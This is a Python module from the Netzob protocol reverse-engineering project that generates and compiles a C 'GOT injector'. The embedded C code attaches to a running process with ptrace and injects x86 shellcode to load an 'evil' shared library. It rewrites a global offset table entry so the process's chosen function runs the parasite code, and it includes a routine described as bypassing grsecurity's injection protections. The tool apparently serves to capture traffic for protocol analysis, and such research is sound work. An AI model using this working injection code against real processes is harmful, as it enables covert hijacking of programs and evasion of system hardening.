# -*- coding: utf-8 -*-

#+---------------------------------------------------------------------------+
#|          01001110 01100101 01110100 01111010 01101111 01100010            |
#|                                                                           |
#|               Netzob : Inferring communication protocols                  |
#+---------------------------------------------------------------------------+
#| Copyright (C) 2011 Georges Bossert and Frédéric Guihéry                   |
#| This program is free software: you can redistribute it and/or modify      |
#| it under the terms of the GNU General Public License as published by      |
#| the Free Software Foundation, either version 3 of the License, or         |
#| (at your option) any later version.                                       |
#|                                                                           |
#| This program is distributed in the hope that it will be useful,           |
#| but WITHOUT ANY WARRANTY; without even the implied warranty of            |
#| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the              |
#| GNU General Public License for more details.                              |
#|                                                                           |
#| You should have received a copy of the GNU General Public License         |
#| along with this program. If not, see <http://www.gnu.org/licenses/>.      |
#+---------------------------------------------------------------------------+
#| @url      : http://www.netzob.org                                         |
#| @contact  : contact@netzob.org                                            |
#| @sponsors : Amossys, http://www.amossys.fr                                |
#|             Supélec, http://www.rennes.supelec.fr/ren/rd/cidre/           |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Standard library imports
#+---------------------------------------------------------------------------+
from gettext import gettext as _
import logging
import os


#+---------------------------------------------------------------------------+
#| Related third party imports
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Local application imports
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| InjectorGenerator:
#|     Describes and generates a GOT Injector
#+---------------------------------------------------------------------------+
class InjectorGenerator():

    def __init__(self, tmp_folder, parasite):
        # create logger with the given configuration
        self.log = logging.getLogger('netzob.Capturing.GOTPoisoning.InjectorGenerator.py')
        # temporary folder
        self.tmp_folder = tmp_folder
        # parasite generator
        self.parasite = parasite

        # configure
        self.libName = "libNetzob.so.1.0"
        self.libPath = self.tmp_folder + os.sep + self.libName
        self.shellcode = self.produceShellCode()

    def writeInjectorToFile(self):
        source = self.getSourceCode()
        print source
        file = open(self.tmp_folder + "/netzob_injector.c", 'w')
        file.write(source)
        file.close()

    def compileInjector(self):

        f = os.popen("gcc " + self.tmp_folder + "/netzob_injector.c" + " -o " + self.tmp_folder + "/netzob_injector")
        for i in f.readlines():
            print "GCC:", i,

        f = os.popen("chmod +x " + self.tmp_folder + "/netzob_injector")
        for i in f.readlines():
            print "CHMOD:", i,

    #+-----------------------------------------------------------------------+
    #| produceShellCode
    #|     Generates the shellcode in function of:
    #|     - the path of the parasite lib
    #|     -
    #| @param function HijackedFunction to include
    #+-----------------------------------------------------------------------+
    def produceShellCode(self):
        shellcode = ["e9", "3b", "00", "00", "00", "31", "c9", "b0", "05", "5b", "31", "c9", "cd", "80", "83", "ec",
                     "18", "31", "d2", "89", "14", "24", "c7", "44", "24", "04", "00", "20", "00", "00", "c7", "44",
                     "24", "08", "07", "00", "00", "00", "c7", "44", "24", "0c", "02", "00", "00", "00", "89", "44",
                     "24", "10", "89", "54", "24", "14", "b8", "5a", "00", "00", "00", "89", "e3", "cd", "80", "cc",
                     "e8", "c0", "ff", "ff", "ff"]

        print self.libPath
        for x in self.libPath:
            shellcode.append(hex(ord(x))[2:])
        shellcode.append("00")
        return shellcode

    def getSourceCode(self):
        source = '''//+---------------------------------------------------------------------------+
//|         01001110 01100101 01110100 01111010 01101111 01100010             |
//+---------------------------------------------------------------------------+
//| NETwork protocol modeliZatiOn By reverse engineering                      |
//| ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
//|      : GNU GPL v3                                                |
//| @copyright    : Georges Bossert and Frederic Guihery                      |
//| @url          : http://code.google.com/p/netzob/                          |
//| ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
//| @organization : Amossys, http://www.amossys.fr                            |
//+---------------------------------------------------------------------------+
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <elf.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>

#define ORIG_EAX 11
#define MAXBUF 255

/* memrw() request to modify global offset table */
#define MODIFY_GOT 1

/* memrw() request to patch parasite */
/* with original function address */
#define INJECT_TRANSFER_CODE 2
'''
        source = source + "#define EVILLIB \"" + self.getLibName() + "\"\n"
        source = source + "#define EVILLIB_FULLPATH \"" + self.getLibPath() + "\"\n"
        source += '''

/* should be getting lib mmap size dynamically */
/* from map file; this  #define is temporary */
#define LIBSIZE 5472

/* struct to get symbol relocation info */
struct linking_info
{
        char name[256];
        int index;
        int count;
        uint32_t offset;
};

struct segments
{
    unsigned long text_off;
    unsigned long text_len;
    unsigned long data_off;
    unsigned long data_len;
} segment;
unsigned long original;
extern int getstr;

unsigned long text_base;
unsigned long data_segment;
char static_sysenter = 0;

/* make sure to put your shared lib in /lib and name it libtest.so.1.0 */
char mmap_shellcode[] = \"'''
        source = source + self.getShellCode()
        source = source + '''\";

/* the signature for our evil function in our shared object */
/* we use the first 8 bytes of our function code */
/* make sure this is modified based on your parasite (evil function) */
unsigned char evilsig[] = "'''
        source = source + self.getParasiteSignature()
        source = source + '''\";

/* here is the signature for our transfer code, this will vary */
/* depending on whether or not you use a function pointer or a */
/* movl/jmp sequence. The one below is for a function pointer */
unsigned char tc[] = "\\xc7\\x45\\xf4\\x00";


/*  Our memrw() function serves three purposes
 1. modify .got entry with replacement function
 2. patch transfer code within replacement function
 3. read from any text memory location in process
*/

unsigned long evil_base;

unsigned long memrw(unsigned long *buf, unsigned long vaddr, unsigned int size, int pid, unsigned long new)
{
    int i, j, data;
    int ret;
    int ptr = vaddr;

    /* get the memory address of the function to hijack */
    if (size == MODIFY_GOT && !buf)
    {
        printf("Modifying GOT(%x)\\\n", vaddr);
        original = (unsigned long)ptrace(PTRACE_PEEKTEXT, pid, vaddr);
        ret = ptrace(PTRACE_POKETEXT, pid, vaddr, new);
        return (unsigned long)ptrace(PTRACE_PEEKTEXT, pid, vaddr);
    }
    else
    if(size == INJECT_TRANSFER_CODE)
    {
        printf("Injecting %x at 0x%x\\n", new, vaddr);
        ptrace(PTRACE_POKETEXT, pid, vaddr, new);

        j = 0;
        vaddr --;
        for (i = 0; i < 2; i++)
        {
            data = ptrace(PTRACE_PEEKTEXT, pid, (vaddr + j));
            buf[i] = data;
            j += 4;
        }
        return 1;
    }
    else
    printf("Reading from process image at 0x%x\\n", vaddr);
        for (i = 0, j = 0; i < size; i+= sizeof(uint32_t), j++)
        {
                /* PTRACE_PEEK can return -1 on success, check errno */
                if(((data = ptrace(PTRACE_PEEKTEXT, pid, vaddr + i)) == -1) && errno)
                        return -1;
                buf[j] = data;
        }
        return i;
}

/* bypass grsec patch that prevents code injection into text */
int grsec_mmap_library(int pid)
{
    struct  user_regs_struct reg;
        long eip, esp, string, offset, str,
        eax, ebx, ecx, edx, orig_eax, data;
    int syscall;
    int i, j = 0, ret, status, fd;
    char library_string[MAXBUF];
    char orig_ds[MAXBUF];
    char buf[MAXBUF] = {0};
    unsigned char tmp[8192], *mem;
    char open_done = 0, mmap_done = 0;
    unsigned long sysenter = 0;
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
    int libfd;
    struct stat lst;
    long text_offset, text_length, data_offset, data_length;

    if ((libfd = open(EVILLIB_FULLPATH, O_RDONLY)) == -1)
    {
        perror("open");
        return 0;
    }

    if (fstat(libfd, &lst) < 0)
    {
        perror("fstat");
        return 0;
    }

    mem = mmap(NULL, lst.st_size, PROT_READ, MAP_PRIVATE, libfd, 0);
    if (mem == MAP_FAILED)
    {
        perror("mmap");
        return 0;
    }

    ehdr = (Elf32_Ehdr *)mem;
    phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);

    for (i = ehdr->e_phnum; i-- > 0; phdr++)
        if (phdr->p_type == PT_LOAD && phdr->p_offset == 0)
        {
            text_offset = phdr->p_offset;
            text_length = phdr->p_filesz;

            phdr++;

            data_offset = phdr->p_offset;
            data_length = phdr->p_filesz;
            break;
        }

    strcpy(library_string, EVILLIB_FULLPATH);

    /* backup first part of data segment which will use for a string and some vars */
    memrw ((unsigned long *)orig_ds, data_segment, strlen(library_string)+32, pid, 0);

    /* store our string for our evil lib there */
    for (i = 0; i < strlen(library_string); i += 4)
        ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long *)(library_string + i));

    /* verify we have the correct string */
    for (i = 0; i < strlen(library_string); i+= 4)
        *(long *)&buf[i] = ptrace(PTRACE_PEEKTEXT, pid, (data_segment + i));

    if (strcmp(buf, EVILLIB_FULLPATH) == 0)
        printf("Verified string is stored in DS: %s\\n", buf);
    else
    {
        printf("String was not properly stored in DS: %s\\n", buf);
        return 0;
    }

    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    wait(NULL);

    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

    eax = reg.eax;
        ebx = reg.ebx;
        ecx = reg.ecx;
        edx = reg.edx;
        eip = reg.eip;
        esp = reg.esp;

    long syscall_eip = reg.eip - 20;

    /* this gets sysenter dynamically incase its randomized */
    if (!static_sysenter)
    {
               memrw((unsigned long *)tmp, syscall_eip, 20, pid, 0);
                for (i = 0; i < 20; i++)
                {
                    if (!(i % 10))
                            printf("\\n");
                        printf("%.2x ", tmp[i]);
                        if (tmp[i] == 0x0f && tmp[i + 1] == 0x34)
                            sysenter = syscall_eip + i;
            }
    }
    /* this works only if sysenter isn't at random location */
    else
    {
        memrw((unsigned long *)tmp, 0xffffe000, 8192, pid, 0);
        for (i = 0; i < 8192; i++)
        {
            if (tmp[i] == 0x0f && tmp[i+1] == 0x34)
                sysenter = 0xffffe000 + i;
        }

    }

    sysenter -= 5;

    if (!sysenter)
    {
        printf("Unable to find sysenter\\n");
        exit(-1);
    }
    printf("Sysenter found: %x\\n", sysenter);
    /*
     sysenter should point to:
              push   %ecx
              push   %edx
              push   %ebp
              mov    %esp,%ebp
              sysenter
     */

    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    wait(0);

        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
        {
            perror("ptrace_attach");
              exit(-1);
        }
        waitpid(pid, &status, WUNTRACED);

    reg.eax = SYS_open;
    reg.ebx = (long)data_segment;
    reg.ecx = 0;
    reg.eip = sysenter;

    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

    for(i = 0; i < 5; i++)
    {
        ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
        wait(NULL);
        ptrace(PTRACE_GETREGS, pid, NULL, &reg);
        if (reg.eax != SYS_open)
            fd = reg.eax;
    }
    offset = (data_segment + strlen(library_string)) + 8;

    reg.eip = sysenter;
        reg.eax = SYS_mmap;
        reg.ebx = offset;

        ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
        ptrace(PTRACE_POKETEXT, pid, offset + 4, text_length + (PAGE_SIZE - (text_length & (PAGE_SIZE - 1))));
        ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);   // PROT_READ|PROT
        ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);   // MAP_SHARED
        ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);   // fd
        ptrace(PTRACE_POKETEXT, pid, offset + 20, text_offset);

    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

     for(i = 0; i < 5; i++)
        {
                ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
                wait(NULL);
                ptrace(PTRACE_GETREGS, pid, NULL, &reg);
        if (reg.eax != SYS_mmap)
            evil_base = reg.eax;
        }

    reg.eip = sysenter;
    reg.eax = SYS_mmap;
    reg.ebx = offset;

    ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
        ptrace(PTRACE_POKETEXT, pid, offset + 4, data_length + (PAGE_SIZE - (data_length & (PAGE_SIZE - 1))));
        ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);   // PROT_READ|PROT_WRITE
        ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);   // MAP_SHARED
        ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);   // fd
        ptrace(PTRACE_POKETEXT, pid, offset + 20, data_offset);

    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
        ptrace(PTRACE_GETREGS, pid, NULL, &reg);

        for(i = 0; i < 5; i++)
        {
                ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
                wait(NULL);
    }

    printf("Restoring data segment\\n");
        for (i = 0; i < strlen(library_string) + 32; i++)
               ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long *)(orig_ds + i));

    reg.eip = eip;
    reg.eax = eax;
    reg.ebx = ebx;
    reg.ecx = ecx;
    reg.edx = edx;
    reg.esp = esp;

    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}
/* function to load our evil library */
int mmap_library(int pid)
{
        struct  user_regs_struct reg;
        long eip, esp, string, offset, str,
    eax, ebx, ecx, edx;

    int i, j = 0, ret, status;
      unsigned long buf[30];
         unsigned char saved_text[94];
    unsigned char *p;

    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

        eip = reg.eip;
        esp = reg.esp;
    eax = reg.eax;
    ebx = reg.ebx;
    ecx = reg.ecx;
    edx = reg.edx;

    offset = text_base;

    printf("%%eip -> 0x%x\\n", eip);
    printf("Injecting mmap_shellcode at 0x%x\\n", offset);

    /* were going to load our shellcode at base */
    /* first we must backup the original code into saved_text */
    for (i = 0; i < ''' + str(len(self.shellcode)) + '''; i += 4)
        buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));
    p = (unsigned char *)buf;
    memcpy(saved_text, p, ''' + str(len(self.shellcode)) + ''');

    printf("Here is the saved code we will be overwriting:\\n");
    for (j = 0, i = 0; i < ''' + str(len(self.shellcode)) + '''; i++)
    {
        if ((j++ % 20) == 0)
            printf("\\n");
        printf("\\\\x%.2x", saved_text[i]);
    }
    printf("\\n");
         /* load shellcode into text starting at eip */
        for (i = 0; i < ''' + str(len(self.shellcode)) + '''; i += 4)
               ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(mmap_shellcode + i));

    printf("\\nVerifying shellcode was injected properly, does this look ok?\\n");
    j = 0;
    for (i = 0; i < ''' + str(len(self.shellcode)) + '''; i += 4)
        buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));

    p = (unsigned char *) buf;
    for (j = 0, i = 0; i < ''' + str(len(self.shellcode)) + '''; i++)
    {
        if ((j++ % 20) == 0)
            printf("\\n");
        printf("\\\\x%.2x", p[i]);
    }

    printf("\\n\\nSetting %%eip to 0x%x\\n", offset);

    reg.eip = offset + 2;
        ptrace(PTRACE_SETREGS, pid, NULL, &reg);

    ptrace(PTRACE_CONT, pid, NULL, NULL);

    wait(NULL);
    /* check where eip is now at */
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

    printf("%%eip is now at 0x%x, resetting it to 0x%x\\n", reg.eip, eip);
    printf("inserting original code back\\n");

    for (j = 0, i = 0; i < ''' + str(len(self.shellcode)) + '''; i += 4)
        buf[j++] = ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(saved_text + i));

    /* get base addr of our mmap'd lib */
    evil_base = reg.eax;

    reg.eip = eip;
    reg.eax = eax;
    reg.ebx = ebx;
    reg.ecx = ecx;
    reg.edx = edx;
    reg.esp = esp;

        ptrace(PTRACE_SETREGS, pid, NULL, &reg);

    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
    {
        perror("ptrace_detach");
        exit(-1);
    }

}

/* this parses/pulls the R_386_JUMP_SLOT relocation entries from our process */

struct linking_info * get_plt(unsigned char *mem)
{
        Elf32_Ehdr *ehdr;
        Elf32_Shdr *shdr, *shdrp, *symshdr;
        Elf32_Sym *syms, *symsp;
        Elf32_Rel *rel;

        char *symbol;
        int i, j, symcount, k;

        struct linking_info *link;

        ehdr = (Elf32_Ehdr *)mem;
        shdr = (Elf32_Shdr *)(mem + ehdr->e_shoff);

        shdrp = shdr;

        for (i = ehdr->e_shnum; i-- > 0; shdrp++)
        {
                if (shdrp->sh_type == SHT_DYNSYM)
                {
                        symshdr = &shdr[shdrp->sh_link];
                        if ((symbol = malloc(symshdr->sh_size)) == NULL)
                                goto fatal;
                        memcpy(symbol, (mem + symshdr->sh_offset), symshdr->sh_size);

                        if ((syms = (Elf32_Sym *)malloc(shdrp->sh_size)) == NULL)
                                goto fatal;

                        memcpy((Elf32_Sym *)syms, (Elf32_Sym *)(mem + shdrp->sh_offset), shdrp->sh_size);
                        symsp = syms;

                        symcount = (shdrp->sh_size / sizeof(Elf32_Sym));
                        link = (struct linking_info *)malloc(sizeof(struct linking_info) * symcount);
                        if (!link)
                                goto fatal;

                        link[0].count = symcount;
                        for (j = 0; j < symcount; j++, symsp++)
                        {
                                strncpy(link[j].name, &symbol[symsp->st_name], sizeof(link[j].name)-1);
                                if (!link[j].name)
                                        goto fatal;
                                link[j].index = j;
                        }
                        break;
                }
        }
     for (i = ehdr->e_shnum; i-- > 0; shdr++)
        {
                switch(shdr->sh_type)
                {
                        case SHT_REL:
                                 rel = (Elf32_Rel *)(mem + shdr->sh_offset);
                                 for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++)
                                 {
                                        for (k = 0; k < symcount; k++)
                                        {
                                                if (ELF32_R_SYM(rel->r_info) == link[k].index)
                                                        link[k].offset = rel->r_offset;
                                        }
                                 }
                                 break;
                        case SHT_RELA:
                                break;

                        default:
                                break;
                }
        }

        return link;
        fatal:
                return NULL;
}

unsigned long search_evil_lib(int pid, unsigned long vaddr)
{
    unsigned char *buf;
    int i = 0, ret;
    int j = 0, c = 0;
    unsigned long evilvaddr = 0;

    if ((buf = malloc(LIBSIZE)) == NULL)
    {
        perror("malloc");
        exit(-1);
    }

    ret = memrw((unsigned long *)buf, vaddr, LIBSIZE, pid, 0);
    printf("Searching at library base [0x%x] for evil function\\n", vaddr);

    for (i = 0; i < LIBSIZE; i++)
    {
      printf("%.2x ", buf[i]);
             if (buf[i] == evilsig[0] && buf[i+1] == evilsig[1] && buf[i+2] == evilsig[2]
         && buf[i+3] == evilsig[3] && buf[i+4] == evilsig[4] && buf[i+5] == evilsig[5]
         && buf[i+6] == evilsig[6] && buf[i+7] == evilsig[7])
         {
             evilvaddr = (vaddr + i);
            break;
         }
    }

    c = 0;
    j = evilvaddr;
    printf("Printing parasite code ->\\n");
    while (j++ < evilvaddr + 50)
    {
        if ((c++ % 20) == 0)
            printf("\\n");
        printf("%.2x ", buf[i++]);
    }
    printf("\\n");

    if (evilvaddr)
        return (evilvaddr);
    return 0;
}

int check_for_lib(char *lib, FILE *fd)
{
    char buf[MAXBUF];

     while(fgets(buf, MAXBUF-1, fd))
                if (strstr(buf, lib))
                    return 1;
    return 0;
}

int main(int argc, char **argv)
{
     char meminfo[20], ps[7], buf[MAXBUF], tmp[MAXBUF], *p, *file;
           char *function, et_dyn = 0, grsec = 0;
    FILE *fd;
        uint32_t i;
        struct stat st;
        unsigned char *mem;
        int md, status;
        Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
        Elf32_Addr text_vaddr, got_offset;
        Elf32_Addr export, elf_base, dyn_mmap_got_addr;
        unsigned long evilfunc;
        struct linking_info *lp;
    int pid;
    unsigned char *libc;

    if (argc < 3)
    {
        usage:
        printf("Usage: %s <pid> <function> [opts]\\n"
               "-d    ET_DYN processes\\n"
               "-g    bypass grsec binary flag restriction \\n"
               "-2     Meant to be used as a secondary method of\\n"
               "finding sysenter with -g; if -g fails, then add -2\\n"
               "Example 1: %s <pid> <function> -g\\n"
               "Example 2: %s <pid> <function> -g -2\\n", argv[0],argv[0],argv[0]);

        exit(0);
    }
    i = 0;

    while (argv[1][i] >= '0' && argv[1][i] <= '9')
            i++;
        if (i != strlen(argv[1]))
        goto usage;

    if (argc > 3)
    {
        if (argv[3][0] == '-' && argv[3][1] == 'd')
            et_dyn = 1;

        if (argv[3][0] == '-' && argv[3][1] == 'g')
            grsec = 1;
        if (argv[4] && !strcmp(argv[4], "-2"))
            static_sysenter = 1;
        else
        if (argv[4])
        {
            printf("Unrecognized option: %s\\n", argv[4]);
            goto usage;
        }

    }
    pid = atoi(argv[1]);
    if((function = strdup(argv[2])) == NULL)
    {
        perror("strdup");
        exit(-1);
    }

     snprintf(meminfo, sizeof(meminfo)-1, "/proc/%d/maps", pid);

        if ((fd = fopen(meminfo, "r")) == NULL)
        {
                printf("PID: %i cannot be checked, /proc/%i/maps does not exist\\n", pid, pid);
                return -1;
        }

    /* ET_DYN */
    if (et_dyn)
    {
        while (fgets(buf, MAXBUF-1, fd))
        {
            if (strstr(buf, "r-xp") && !strstr(buf, ".so"))
            {
                strncpy(tmp, buf, MAXBUF-1);

                if ((p = strchr(buf, '-')))
                                    *p = '\\0';

                text_base = strtoul(buf, NULL, 16);

                if (strchr(tmp, '/'))
                    while (tmp[i++] != '/');
                else
                {
                    fclose(fd);
                    printf("error parsing pid map\\n");
                    exit(-1);
                }
                    if ((file = strdup((char *)&tmp[i - 1])) == NULL)
                {
                    perror("strdup");
                    exit(-1);
                }
                i = 0;
                while (file[i++] != '\\n');
                    file[i - 1] = '\\0';
                goto next;
             }
        }
    }
    /* ET_EXEC */
        fgets(buf, MAXBUF-1, fd);
        strncpy(tmp, buf, MAXBUF-1);

        if (strchr(tmp, '/'))
                while (tmp[i++] != '/');
        else
        {
                fclose (fd);
                printf("error parsing pid map\\n");
        exit(-1);
        }
    if ((file = strdup((char *)&tmp[i - 1])) == NULL)
        {
        perror("strdup");
        exit(-1);
    }

        i = 0;
        while (file[i++] != '\\n');
        file[i - 1] = '\\0';

    next:

        if ((md = open(file, O_RDONLY)) == -1)
        {
        perror("open");
                exit(-1);
        }

        if (fstat(md, &st) < 0)
        {
                perror("fstat");
                exit(-1);
        }

        mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, md, 0);
        if (mem == MAP_FAILED)
        {
                perror("mmap");
                exit(-1);
        }


        ehdr = (Elf32_Ehdr *)mem;

    if (ehdr->e_ident[0] != 0x7f && strcmp(&ehdr->e_ident[1], "ELF"))
    {
        printf("%s is not an ELF file\\n", file);
        goto done;
    }

    /* we target executables only, althoug ET_DYN would be a viable target */
    /* as well */
    if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN)
    {
        printf("%s is not an executable or object file, cannot target process %d\\n", file, pid);
        goto done;
    }
    if (ehdr->e_type == ET_DYN && !et_dyn)
    {
        printf("Target process is of type ET_DYN, but the '-d' option was not specified -- exiting...\\n");
        goto done;
    }

    phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);

    /* get the base -- p_vaddr of text segment */
    for (i = ehdr->e_phoff; i-- > 0; phdr++)
    {
        if (phdr->p_type == PT_LOAD && !phdr->p_offset)
        {
            elf_base = text_base = phdr->p_vaddr;
            phdr++;
            data_segment = phdr->p_vaddr;
            break;
        }
    }

        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
        {
        printf("Failed to attach to process\\n");
                exit(-1);
        }
        waitpid(pid, &status, WUNTRACED);

    /* get the symbol relocation information */
        if ((lp = (struct linking_info *)get_plt(mem)) == NULL)
        {
               printf("get_plt() failed\\n");
               goto done;
        }

    /* inject mmap shellcode into process to load lib */
    if (check_for_lib(EVILLIB, fd) == 0)
     {
        printf("Injecting library\\n");
        if (grsec)
            grsec_mmap_library(pid);
        else
            mmap_library(pid);
        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
            {
                       perror("ptrace_attach");
                       exit(-1);
              }
               waitpid(pid, &status, WUNTRACED);
        fclose(fd);

        if ((fd = fopen(meminfo, "r")) == NULL)
             {
                    printf("PID: %i cannot be checked, /proc/%i/maps does not exist\\n", pid, pid);
                    return -1;
            }
    }
    else
    {
        printf("Process %d appears to be infected, %s is mmap'd already\\n", pid, EVILLIB);
        goto done;
    }

    if ((evilfunc = search_evil_lib(pid, evil_base)) == 0)
    {
        printf("Could not locate evil function\\n");
        goto done;
    }


    printf("Evil Function location: %x\\n", evilfunc);
    printf("Modifying GOT entry: replace <%s> with %x\\n", function, evilfunc);

    /* overwrite GOT entry with addr to evilfunc (our replacement) */


        for (i = 0; i < lp[0].count; i++)
        {
            if (strcmp(lp[i].name, function) == 0)
               {
               if (et_dyn)
                dyn_mmap_got_addr = (evil_base + (lp[i].offset - elf_base));

               got_offset = (!et_dyn) ? lp[i].offset : dyn_mmap_got_addr;

                   export = memrw(NULL, got_offset, 1, pid, evilfunc);
                          if (export == evilfunc)
                       printf("Successfully modified GOT entry\\n\\n");
               else
               {
                       printf("Failed at modifying GOT entry\\n");
                goto done;
               }
               printf("New GOT value: %x\\n", export);

           }
        }

    unsigned char evil_code[256];
    unsigned char initial_bytes[12];
    unsigned long injection_vaddr = 0;

    /* get a copy of our replacement function and search for transfer sequence */
    memrw((unsigned long *)evil_code, evilfunc, 256, pid, 0);

    /* once located, patch it with the addr of the original function */
    for (i = 0; i < 256; i++)
    {
        printf("%.2x ", evil_code[i]);
        if (evil_code[i] == tc[0] && evil_code[i+1] == tc[1] && evil_code[i+2] == tc[2] && evil_code[i+3] == tc[3])
        {
            printf("\\nLocated transfer code; patching it with %x\\n", original);
            injection_vaddr = (evilfunc + i) + 3;
            break;
        }
    }

    if (!injection_vaddr)
    {
        printf("Could not locate transfer code within parasite\\n");
        goto done;
    }

    /* patch jmp code with addr to original function */
    memrw((unsigned long *)initial_bytes, injection_vaddr, INJECT_TRANSFER_CODE, pid, original);

    printf("Confirm transfer code: ");
    for (i = 0; i < 7; i++)
        printf("\\\\x%.2x", initial_bytes[i]);
    puts("\\n");

    done:
    munmap(mem, st.st_size);
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
                perror("ptrace_detach");

    close(md);
    fclose(fd);
    exit(0);

}
'''
        return source

    def getLibName(self):
        return self.libName

    def getLibPath(self):
        return self.libPath

    def getShellCode(self):
        return "\\x" + "\\x".join(self.shellcode)

    def getParasiteSignature(self):
        return "\\x" + "\\x".join(self.parasite.getParasitesSignature()[0])

    def getFolder(self):
        return self.tmp_folder
